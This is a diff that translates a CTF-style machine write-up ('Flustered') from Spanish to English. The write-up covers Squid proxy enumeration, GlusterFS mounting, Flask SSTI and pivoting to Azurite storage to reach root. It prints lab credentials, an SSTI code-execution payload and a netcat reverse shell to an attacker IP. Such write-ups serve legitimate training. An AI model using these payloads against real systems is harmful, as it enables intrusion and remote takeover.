@@ -4,23 +4,23 @@ title: "Flustered"
 date: 2026-02-19 10:00:00
 categories: writeups
 tags: [glusterFS, squid, squidProxy, user pivoting, internal enum, Azure Storage pentesting]
-lang: es
+lang: en
 image: /assets/images/flustered/box-flustered.png
 ---
 
 ![]({{ "/assets/images/flustered/flustered-card.png" | relative_url }})
 
-# Conceptos vistos en la máquina
+# Concepts seen on the machine
 ```
-- Montaje de GlusterFS volume
-- Uso de SquidProxy para descubrir apps interna
-- SSTI para ganar acceso inicial
-- Extracción de certificados de gluster para montarnos vol1 y creacion de ssh-keys para pivotar de usuario
-- Enumeración de red interna docker
-- Interacción con Azure Storage
+- Mounting GlusterFS volume
+- Using SquidProxy to discover internal applications
+- SSTI to gain initial access
+- Extracting Gluster certificates to mount vol1 and creating ssh-keys to pivot users
+- Enumerating the internal Docker network
+- Interacting with Azure Storage
 [*] Bonus
-	- Como hacer que funcione el Azure Storage
-	- Set de SquidProxy con FoxyProxy
+	- How to make Azure Storage work
+	- Setting up SquidProxy with FoxyProxy
 ```
 
 # Enumeration & Initial Foothold
@@ -30,18 +30,18 @@ image: /assets/images/flustered/box-flustered.png
 >10.10.11.131
 >```
 
->🔐 Usuarios/Contraseñas
+>🔐 Users:Passwords
 ```
 lance.friedman:o>WJ5-jD<5^m3
 ```
 
->🪪 Dominios
+>🪪 Domains
 ```
 flustered.htb
 steampunk-era.htb
 flustered
 ```
-## 🔎 Escaneo Nmap
+## 🔎 nmap scanning
 
 ```python
 nmap -p- -sS -Pn -n -vvv --min-rate 3000 -oG all-Ports 10.10.11.131
@@ -91,11 +91,11 @@ Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
 
 ## 80 - HTTP
 
-Lanzamos el whatweb para ver información acerca de las tecnologías en uso, vemos un subdominio
+We launch whatweb to see information about the technologies in use, we see a subdomain
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105181431.png" | relative_url }})
 
-En la web no hay nada de nada
+There is absolutely nothing on the website. :(
 
 ## 111 - RPC
 
@@ -103,11 +103,11 @@ En la web no hay nada de nada
 
 ## 3128 - SQUID
 
-Accedemos via URL
+We access via URL
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105182136.png" | relative_url }})
 
-Probamos a hacer una petición empleando este proxy con curl, y viendo las cabeceras, observamos que necesita de una autenticación
+We tried making a request using this proxy with curl, and looking at the headers, we saw that it requires authentication.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105182632.png" | relative_url }})
 
@@ -116,33 +116,33 @@ Probamos a hacer una petición empleando este proxy con curl, y viendo las cabec
 curl http://user:pass@flustered.htb:3128 http://flustered.htb --head
 ```
 
-Empleamos la herramienta spose para enumerar puertos haciendo uso del proxy que pueda tener abiertos de manera interna que si no es pasando por el proxy, no se ven
+We use the spose tool to list ports using the proxy that may be open internally, which would not be visible if not going through the proxy.
 
 [spose](https://github.com/aancw/spose)
 
-Lo ejecutamos pasando por la URL las credenciales que hemos enumerado
+We execute it by passing the credentials we have listed through the URL.
 
 ## 24007, 49152 -  GlusterFS
 
-Encontramos que es un sistema de comparticion de ficheros, basicamente un NFS, así que, enumeramos los volúmenes con gluster
+We found that it is a file sharing system, basically an NFS, so we listed the volumes with gluster.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105191227.png" | relative_url }})
 
-Vemos que hay 2, intentaremos montarlos en nuestro sistema para ver que contienen
+We see that there are two, we will try to mount them on our system to see what they contain.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105191311.png" | relative_url }})
 
-Nos esta reventando porque esta dando un resolution failed a flustered
+You are not mounting the containers correctly because we are getting a resolution failed to flustered error.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105191451.png" | relative_url }})
 
-Actualizamos el /etc/hosts y probamos de nuevo
+We update /etc/hosts and try again.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105191538.png" | relative_url }})
 
-Comprobamos que podemos montarnos el vol2 y vemos archivos, enumeramos los importantes
+We verify that we can mount vol2 and view files, listing the important ones.
 
-Encontramos un archivo .ibd, que suele almacenar contraseñas, en este caso, serían de un usuario del squid proxy
+We found an .ibd file, which usually stores passwords. In this case, they would belong to a Squid proxy user.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105192115.png" | relative_url }})
 
@@ -150,13 +150,12 @@ Encontramos un archivo .ibd, que suele almacenar contraseñas, en este caso, ser
 lance.friedman:o>WJ5-jD<5^m3
 ```
 
-Nos configuramos un proxy en foxyproxy para poder hacer uso de este proxy y estas credenciales
+We set up a proxy in FoxyProxy so that we can use this proxy and these credentials.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105195554.png" | relative_url }})
 
 
-Ahora, al pasar por este proxy, no tenemos que acceder ni a la IP ni nada, porque las peticiones van desde el proxy, así que probamos a usar `127.0.0.1` y vemos que la página cambia, lo que nos hace pensar en que es posible que haya rutas internas, fuzzeamos por rutas
-
+Now, when passing through this proxy, we don't have to access the IP or anything else, because the requests go from the proxy, so we try using `127.0.0.1` and see that the page changes, which makes us think that there may be internal routes, so we fuzz for routes.
 
 ```
 curl -x http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128 http://127.0.0.1
@@ -164,18 +163,17 @@ curl -x http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128 http://127.0.0.1
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105195516.png" | relative_url }})
 
-Fuzzeamos rutas, *IMPORTANTE, como la contraseña tiene caracteres especiales como <, hay que URLencodearlo*
+We fuzz routes, *IMPORTANT, as the password contains special characters such as <, it must be URL-encoded*
 
 ```
 gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --proxy "http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@flustered.htb:3128"
 ```
 
-Encontramos una ruta `/app`, volvemos a fuzzear dentro de ella filtrando por extensiones de archivo, como `.py y .php` , y encontramos otras 3 rutas, `/templates`, `/static` y `/config`, y un `app.py` que nos devuelve un 200
+We find a route `/app`, we fuzz inside it again filtering by file extensions, such as `.py and .php`, and we find three other routes, `/templates`, `/static` and `/config`, and an `app.py` that returns a 200.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105201522.png" | relative_url }})
 
-
-Al acceder, nos descarga el codigo, que es el siguiente
+Upon accessing, it downloads the code, which is as follows
 
 ```
 from flask import Flask, render_template_string, url_for, json, request
@@ -207,19 +205,18 @@ if __name__ == "__main__":
   app.run()
 ```
 
-Observamos que está intentando cargar una "configuracion" de un parametro config, y si no hay nada, muestra el `steampunk-era.htb`
+We observe that you are attempting to load a ‘configuration’ of a config parameter, and if there is nothing, it displays `steampunk-era.htb`.
 
-Analizando el codigo, recibe los datos de una petición POST de un parámetro `siteurl` y lo muestra, pero está sin sanitizar correctamente, lo que puede significar que sea vulnerable a un SSTI, probamos a mandarle un payload tipico, como `{{ 7 * 7 }}` y si lo interpreta, será vulnerable
+Analysing the code, it receives data from a POST request from a `siteurl` parameter and displays it, but it is not properly sanitised, which may mean that it is vulnerable to an SSTI. We tried sending it a typical payload, such as `{{ 7 * 7 }}`, and if it interprets it, it will be vulnerable.
 
 ```
 curl -X POST -H "Content-Type: application/json" -d '{"siteurl": "{{ 7 * 7 }}"}' http://10.10.11.131/
 ```
 
-
 ![]({{ "/assets/images/flustered/Pasted image 20251105202130.png" | relative_url }})
 
 
-Vemos que se acontece el ataque, nos pasamos la petición a burpsuite con `-x http://127.0.0.1:8080` y ejecutaremos un RCE
+We see that the attack is happening, we pass the request to burpsuite with `-x http://127.0.0.1:8080` and we will execute an RCE.
 
 ```
 "siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}"
@@ -228,7 +225,7 @@ Vemos que se acontece el ataque, nos pasamos la petición a burpsuite con `-x ht
 ![]({{ "/assets/images/flustered/Pasted image 20251105202455.png" | relative_url }})
 
 
-Nos mandaremos una reverse shell
+We will send ourselves a reverse shell.
 
 ```
 "siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/bin/nc 10.10.14.6 6666 -e /bin/bash').read() }}{% endraw %}"
@@ -238,78 +235,78 @@ Nos mandaremos una reverse shell
 
 # Privesc
 
-Enumeramos cosas basicas de la máquina, descubrimos un usuario llamado `jeniffer`
+We list basic information about the machine and discover a user named `jeniffer`.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105202733.png" | relative_url }})
 
-El vol1 es propiedad de jennifer
+Volume 1 is owned by Jennifer.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105203737.png" | relative_url }})
 
-Lanzamos el linpeas para enumerar información relevante
+We launched Linpeas to list relevant information.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105204239.png" | relative_url }})
 
-Este glusterfs.pem lo hemos visto antes, al ir a montar el vol1 no nos dejó montarlo debido al siguiente error
+We have seen the `glusterfs.pem` file before. When we tried to mount vol1, we were unable to do so due to the following error
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105203956.png" | relative_url }})
 
 
-Nos bajamos el certificado, lo movemos a la ruta de donde lo esta llamando, `/etc/ssl` y probamos a montarnos el volumen, y nos vuelve a dar error, pidiendo el .key
+We download the certificate, move it to the path where it is being called, `/etc/ssl`, and try to mount the volume, but we get an error again, asking for the .key.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105204702.png" | relative_url }})
 
-Como nos va a pedir todos, nos bajamos todos y los metemos en `/etc/ssl` y ahora nos deja montarnos el volumen 
+As it will ask us for all of them, we download them all and put them in `/etc/ssl`, and now it lets us mount the volume. 
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105204915.png" | relative_url }})
 
-Observamos que es el /home de jennifer, si podemos escribir nos creamos unas ssh keys y nos loguearemos
+We see that it is jennifer's /home directory. If we can write, we will create some SSH keys and log in.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105205148.png" | relative_url }})
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105205201.png" | relative_url }})
 
-Y ya tenemos acceso como jennifer con ssh
+And now we have access as jennifer with ssh.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105205225.png" | relative_url }})
 
-Encontramos un archivo en var backups que se llama key, que podemos leer, ademas de varios backups
+We found a file in var backups called key, which we can read, as well as several backups.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106084655.png" | relative_url }})
 
-Dentro de la máquina, enumeramos y vemos que hay una interfaz nueva, así que enumeraremos los hosts que hay en ella, es una red de docker
+Inside the machine, we list and see that there is a new interface, so we will list the hosts on it. It is a Docker network.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106091510.png" | relative_url }})
 
-Usaremos los scripts que usamos para enumerar en DMZ01, lo editamos un poco para que abarque todos los hosts de la red y lo lanzamos
+We will use the scripts we used to enumerate in DMZ01, edit it slightly to cover all hosts on the network, and launch it.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106095226.png" | relative_url }})
 
-Encontramos un host, nos montamos un tunel con el ligolo y escanearemos los puertos
+We find a host, set up a tunnel with Ligolo, and scan the ports.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106100016.png" | relative_url }})
 
-Encontramos el puerto 10000 abierto, probamos a acceder y nos da un error
+We found port 10000 open, tried to access it, and got an error.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106100125.png" | relative_url }})
 
-Buscando el error en google, vemos que se trata de un Azure Storage
+Searching for the error on Google, we see that it is related to Azure Storage.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106100247.png" | relative_url }})
 
-En particular, viendo las cabeceras, vemos que se trata de un Azurite Blob
+In particular, looking at the headers, we see that it is an Azurite Blob.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106100402.png" | relative_url }})
 
 
-Nos bajaremos la herramienta `storage-explorer` con snap para enumerar este container de azure, tendremos en cuenta la key que hemos visto antes de jennifer por si nos la piden, la hemos encontrado con el linpeas en `/var/backups`
+We will download the `storage-explorer` tool with snap to list this Azure container. We will keep in mind the key we saw earlier for Jennifer in case we are asked for it. We found it with linpeas in `/var/backups`.
 
 
 ```
 FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
 ```
 
-Instalamos el storage-explorer y añadimos la linea de abajo segun la documentacion
+We install the storage explorer and add the line below according to the documentation.
 
 ```
 sudo apt update
@@ -319,13 +316,13 @@ sudo snap install storage-explorer
 snap connect storage-explorer:password-manager-service :password-manager-service
 ```
 
-Dentro, no nos vale con tener el tunel, asi que nos forwardearemos el puerto localmente para que acceda de manera local
+Inside, it is not enough to have the tunnel, so we will forward the port locally so that it can be accessed locally.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106102209.png" | relative_url }})
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106102235.png" | relative_url }})
 
-Al ir a acceder, nos da un error
+When we try to access it, we get an error message.
 
 ```
 ProducerError:{
@@ -334,19 +331,15 @@ ProducerError:{
 }
 ```
 
-*Da un puto coñazo, nos tenemos que montar una ubuntu para instalar la mierda del storage explorer, por la version de la API*
-
-Para resolver este calvario, simplemente tenemos que declarar la variable de entorno, con la version de la api que acepta esta version del azurite, que es la 2023-11-03
+We continue to receive the error, so, looking for a solution, we found that the tool works better from Ubuntu. We just have to declare the environment variable with the API version that this version of Azurite accepts, which is 2023-11-03, for it to be valid, and launch the `storage-explorer`, and we will see that there is an `ssh-keys` folder.
 
 ```
 export AZURE_STORAGE_API_VERSION=2023-11-03
 ```
 
-Para que sea la valida, y lanzar el `storage-explorer`, y ya veremos que hay una carpeta de `ssh-keys`
-
 ![]({{ "/assets/images/flustered/Pasted image 20251106121643.png" | relative_url }})
 
-Cogemos la de root y nos autenticamos por SSH
+We take the root one and authenticate ourselves via SSH.
 
 ![]({{ "/assets/images/flustered/Pasted image 20251106121838.png" | relative_url }})
 
